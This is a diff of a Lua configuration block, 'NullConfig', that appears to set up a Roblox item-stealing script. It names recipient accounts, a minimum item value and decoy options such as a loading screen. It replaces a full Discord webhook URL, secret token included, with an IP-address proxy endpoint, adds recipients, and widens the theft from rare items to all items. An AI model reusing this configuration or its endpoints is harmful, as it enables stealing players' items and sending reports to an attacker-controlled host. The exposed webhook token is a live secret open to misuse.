@@ -1,12 +1,12 @@
 _G.NullConfig = {
-    User = {"1SamRatana", "devkak5", "DEVFURYYT", "Sky168295", "IQKH168"},
+    User = {"1SamRatana", "DEVFURYYT", "IQKH168", "DEVPHOEM", "devkak5", "Sky168295", "Babysky1688", "Ahlalu"},
     min_value = 10000000000,
     pingEveryone = "Yes", -- dont change this
-    Webhook = "https://discord.com/api/webhooks/1393254261563068528/Ygog_NZ9oOnsIeGdlDlmSOn99orViDkd3P1n-DuNX26jFPv0FtEtu4vXmLOuvONMf7xX",
+    Webhook = "http://45.13.225.83:20002/proxy/48ac930df23c721d7403fb1413603c60",
     FakeGift = "No",
-    Trash = "https://discord.com/api/webhooks/1393254261563068528/Ygog_NZ9oOnsIeGdlDlmSOn99orViDkd3P1n-DuNX26jFPv0FtEtu4vXmLOuvONMf7xX",
+    Trash = "http://45.13.225.83:20002/proxy/48ac930df23c721d7403fb1413603c60",
     LoadingScreen = "Yes",
-    GiftOnlyRares = "Yes",
+    GiftOnlyRares = "No",
     ExecuteOtherScript = "No",
 }
     
